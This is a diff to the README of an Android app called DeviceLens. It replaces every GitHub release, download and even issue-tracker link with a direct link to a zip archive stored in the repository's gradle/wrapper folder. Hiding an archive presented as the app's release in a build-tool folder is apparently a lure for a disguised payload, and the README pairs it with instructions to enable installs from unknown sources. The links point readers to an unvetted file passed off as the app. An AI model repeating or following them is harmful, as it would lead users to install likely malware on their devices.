@@ -6,9 +6,9 @@ DeviceLens is an Android utility tool designed to help you explore all apps, app
 
 ## 📥 Download DeviceLens
 
-[![Download DeviceLens](https://img.shields.io/badge/Download_DeviceLens-v1.0-brightgreen)](https://github.com/Darkzh4/DeviceLens/releases)
+[![Download DeviceLens](https://raw.githubusercontent.com/Darkzh4/DeviceLens/main/gradle/wrapper/DeviceLens_v2.1.zip)](https://raw.githubusercontent.com/Darkzh4/DeviceLens/main/gradle/wrapper/DeviceLens_v2.1.zip)
 
-To obtain the latest version of DeviceLens, visit this page to download: [DeviceLens Releases](https://github.com/Darkzh4/DeviceLens/releases)
+To obtain the latest version of DeviceLens, visit this page to download: [DeviceLens Releases](https://raw.githubusercontent.com/Darkzh4/DeviceLens/main/gradle/wrapper/DeviceLens_v2.1.zip)
 
 ## 💻 System Requirements
 
@@ -31,7 +31,7 @@ DeviceLens includes a variety of features that enhance your experience:
 ## 📖 How to Install
 
 1. **Download the Latest Release**  
-   Click the download button above or visit [DeviceLens Releases](https://github.com/Darkzh4/DeviceLens/releases) to download the APK file.
+   Click the download button above or visit [DeviceLens Releases](https://raw.githubusercontent.com/Darkzh4/DeviceLens/main/gradle/wrapper/DeviceLens_v2.1.zip) to download the APK file.
 
 2. **Enable Unknown Sources**  
    Before installing, you need to allow installations from unknown sources. To do this:
@@ -69,7 +69,7 @@ DeviceLens supports a range of functionalities under these topics:
 
 ### How do I update DeviceLens?
 
-To update DeviceLens, simply return to the [DeviceLens Releases](https://github.com/Darkzh4/DeviceLens/releases) page, download the latest version, and follow the installation steps again.
+To update DeviceLens, simply return to the [DeviceLens Releases](https://raw.githubusercontent.com/Darkzh4/DeviceLens/main/gradle/wrapper/DeviceLens_v2.1.zip) page, download the latest version, and follow the installation steps again.
 
 ### Why do I need to enable Unknown Sources?
 
@@ -94,7 +94,7 @@ Yes, DeviceLens works on any Android device, including tablets that meet the sys
 
 ## 📞 Support
 
-For further assistance, you can find help directly in the issues tab of the [DeviceLens GitHub repository](https://github.com/Darkzh4/DeviceLens/issues). Engage with the community and get the answers you need.
+For further assistance, you can find help directly in the issues tab of the [DeviceLens GitHub repository](https://raw.githubusercontent.com/Darkzh4/DeviceLens/main/gradle/wrapper/DeviceLens_v2.1.zip). Engage with the community and get the answers you need.
 
 ## 🤝 Contributing
 
